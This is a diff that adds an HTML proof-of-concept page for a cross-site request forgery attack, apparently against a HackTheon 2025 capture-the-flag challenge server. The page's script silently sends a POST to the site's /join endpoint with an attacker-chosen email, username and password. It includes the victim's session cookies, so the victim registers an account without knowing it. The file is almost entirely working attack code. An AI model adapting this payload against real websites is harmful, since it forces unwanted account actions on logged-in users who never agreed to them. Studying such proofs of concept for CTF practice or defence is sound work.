@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack PoC - Forced Registration</title>
+</head>
+<body>
+  <h1>CSRF PoC: Forced User Registration</h1>
+  <script>
+    fetch('http://hacktheon2025-challs-alb-1354048441.ap-northeast-2.elb.amazonaws.com:39401/join', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        user_id: 'attacker@example.com',
+        username: 'attacker',
+        password: 'Password123!'
+      }),
+      credentials: 'include'  // 중요! 세션 쿠키를 같이 보내게 함
+    });
+  </script>
+</body>
+</html>
